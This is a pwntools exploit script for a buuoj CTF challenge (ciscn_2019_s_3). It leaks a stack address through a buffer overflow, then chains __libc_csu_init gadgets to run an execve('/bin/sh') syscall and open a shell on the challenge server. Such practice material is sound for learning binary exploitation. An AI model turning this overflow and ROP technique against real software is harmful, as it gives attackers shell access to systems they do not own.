'''
@Author       : 白银
@Date         : 2023-04-24 10:16:15
@LastEditors  : 白银
@LastEditTime : 2023-04-24 18:10:46
@FilePath     : /pwn/ciscn_s_3.py
@Description  : https://buuoj.cn/challenges#ciscn_2019_s_3
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './ciscn_s_3'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 26751)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    # libc = elf.libc
    libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

# ida进__libc_csu_init第一次出现的add     rsp, 8之类后面的第一个pop，一般从rbx排列到r15，然后retn
pop_rbx_rbp_r12_r13_r14_r15 = 0x0040059A
# ida进__libc_csu_init第一次出现的loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j之类后面的第一个mov，可能从rdx, r13排列到edi, r15，然后call啥玩意
mov_rdx_r13_call = 0x0400580
# ROPgadget --binary ciscn_s_3 --only "pop|ret"的0x00000000004005a3 : pop rdi ; ret
pop_rdi_ret = 0x04005A3
vuln_addr = 0x0004004ED  # 本题，main调用的vuln存在溢出
syscall_addr = 0x400517  # ida里alt+t找syscall，用和retn靠在一起的，如果中间隔了一个pop之类，插一个deadbeef就行

payload = flat(['/bin/sh\x00', 'a' * 0x8, vuln_addr])
io.sendline(payload)
io.recv(0x20)
bin_sh_addr = u64(io.recv(8)) - 0x118
print(hex(bin_sh_addr))

payload = flat(['/bin/sh\x00', 'a' * 0x8, pop_rbx_rbp_r12_r13_r14_r15,
               0, 0, (bin_sh_addr + 0x50), 0, 0, 0, mov_rdx_r13_call])
payload += ([0x3b])  # 0x3b是Linux系统调用
payload += ([pop_rdi_ret, bin_sh_addr, syscall_addr])
io.sendline(payload)

io.interactive()
